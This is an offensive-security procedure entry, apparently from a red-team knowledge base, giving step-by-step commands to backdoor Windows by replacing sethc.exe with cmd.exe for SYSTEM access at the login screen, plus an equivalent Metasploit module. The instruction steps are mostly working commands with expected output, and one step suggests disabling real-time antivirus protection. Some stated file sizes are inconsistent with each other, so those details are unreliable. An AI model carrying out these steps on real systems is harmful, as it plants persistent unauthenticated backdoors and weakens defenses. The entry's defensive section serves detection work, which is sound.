---
id: 8f760a76-770e-457a-bced-af697ad9d274
name: Windows Sticky Keys Persistence
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:28.137378+00:00'
updated_at: '2023-04-10T20:37:22.430181+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Accessibility Features|T1015 - Accessibility Features]]'
sub_techniques: []
tags:
  - '[[tags/Binary Replacement]]'
  - '[[tags/Binary Replacement on Windows XP+]]'
  - '[[tags/Elevated]]'
  - '[[tags/Windows - Persistence]]'
commands:
  - '[[commands/cmd-takeown-sethc-exe]]'
  - '[[commands/cmd-icacls-sethc-admin]]'
  - '[[commands/cmd-copy-sethc-backup]]'
  - '[[commands/cmd-copy-cmd-to-sethc]]'
  - '[[commands/cmd-dir-sethc-size]]'
  - '[[commands/msfconsole-use-sticky-keys]]'
platforms:
  - Windows
tools: []
validated: true
---

# Windows Sticky Keys Persistence

## Summary

Windows Sticky Keys Persistence is a technique that leverages the built-in Windows accessibility feature to create a backdoor for privilege escalation and persistence. By replacing the sethc.exe binary (responsible for the Sticky Keys functionality) with cmd.exe, an attacker can trigger a SYSTEM-level command prompt at the login screen by pressing the Shift key five times, allowing command execution without authentication.

## Description

This procedure targets Windows systems (XP and later) and requires administrative privileges to modify protected system files. The technique exploits the accessibility feature designed to assist users with disabilities, which launches sethc.exe with elevated privileges when activated. Once replaced, the backdoor provides persistent access even after reboots or password changes, as it operates at the login screen. It is stealthy because it uses native Windows binaries and does not introduce new files or network activity. This method is commonly used in post-exploitation scenarios to maintain access or escalate privileges on domain-joined or standalone Windows machines. Detection can be challenging without file integrity monitoring, but changes to sethc.exe file hash or size can indicate compromise.

## Requirements

1. Administrative privileges on the target Windows system (local or remote access via tools like PSEXEC or RDP).
2. Command Prompt or PowerShell access on the target (e.g., via an existing session or initial foothold).
3. Target running Windows XP or later (tested up to Windows 11; path is C:\Windows\System32\sethc.exe).
4. For the Metasploit alternative, a Meterpreter session established on the target.

## Defense

- Enable file integrity monitoring (e.g., via Sysmon or Windows Defender) to detect modifications to system binaries like sethc.exe.
- Disable unnecessary accessibility features through Group Policy (Computer Configuration > Administrative Templates > Windows Components > Ease of Access).
- Implement application whitelisting (e.g., AppLocker) to prevent unauthorized binary execution from system directories.
- Regularly audit system file hashes against known good baselines using tools like Microsoft Safety Scanner or custom scripts.
- Monitor login screen behaviors and unexpected cmd.exe launches via event logs (Event ID 4624 for logons, or Sysmon for process creation).

## Objectives

1. Replace the Sticky Keys binary to create a persistent backdoor accessible at the login screen.
2. Enable privilege escalation to SYSTEM level without requiring valid credentials.
3. Maintain access to the system across reboots and user logins for further post-exploitation activities.

## Instructions

### Step 1: Take Ownership of sethc.exe

**Context**: The sethc.exe file is protected by TrustedInstaller ownership, so reassign ownership to the current administrator to allow modifications. This step ensures you can proceed without permission errors.

**Command** ([[commands/cmd-takeown-sethc-exe]]):
```cmd
takeown /F C:\Windows\System32\sethc.exe
```

> This command transfers ownership to the administrators group. Expected output: "SUCCESS: The file (or folder): \"C:\Windows\System32\sethc.exe\" now owned by user \"TARGET\Administrators\"."

### Step 2: Grant Full Control Permissions to Administrators

**Context**: After taking ownership, explicitly grant full control to the Administrators group to enable file replacement. This prevents access denied errors during the copy operation.

**Command** ([[commands/cmd-icacls-sethc-admin]]):
```cmd
icacls C:\Windows\System32\sethc.exe /grant administrators:F
```

> Expected output: "processed file: C:\Windows\System32\sethc.exe" with no errors. If successful, the file permissions now allow full read/write/execute for admins.

### Step 3: Backup the Original sethc.exe

**Context**: Create a backup of the original file for potential cleanup or reversion. This is a best practice in red teaming to avoid permanent damage and facilitate stealthy operations.

**Command** ([[commands/cmd-copy-sethc-backup]]):
```cmd
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak
```

> Expected output: "1 file(s) copied." The backup ensures the original functionality can be restored by reversing the copy.

### Step 4: Replace sethc.exe with cmd.exe

**Context**: Overwrite sethc.exe with a copy of cmd.exe to hijack the Sticky Keys trigger. When Shift is pressed five times, cmd.exe will launch as SYSTEM instead of the accessibility tool.

**Command** ([[commands/cmd-copy-cmd-to-sethc]]):
```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

> Expected output: "1 file(s) copied." Verify no antivirus interference; if blocked, consider obfuscation or disabling real-time protection first.

### Step 5: Verify the Replacement

**Context**: Confirm the modification by checking the file size and attributes, which should now match cmd.exe (typically around 30-50 KB depending on Windows version).

**Command** ([[commands/cmd-dir-sethc-size]]):
```cmd
dir C:\Windows\System32\sethc.exe
```

> Expected output: Something like "07/10/2023  12:00 PM           123,456 sethc.exe" – the size and date should align with cmd.exe, not the original sethc.exe (which is larger, ~1-2 MB).

### Alternative: Using Metasploit Post-Exploitation Module

**Context**: If a Meterpreter session is available (e.g., from initial exploitation), use the built-in Metasploit module to automate the replacement. This is faster for remote sessions but requires Metasploit Framework installed on the attacker's machine.

**Command** ([[commands/msfconsole-use-sticky-keys]]):
```msfconsole
use post/windows/manage/sticky_keys
set SESSION 1
run
```

> Replace "1" with your actual session ID (use "sessions -l" to list). Expected output: Module runs silently if successful, confirming "Sticky Keys replaced" or similar; check session for errors. This module performs the same replacement as the manual steps above.
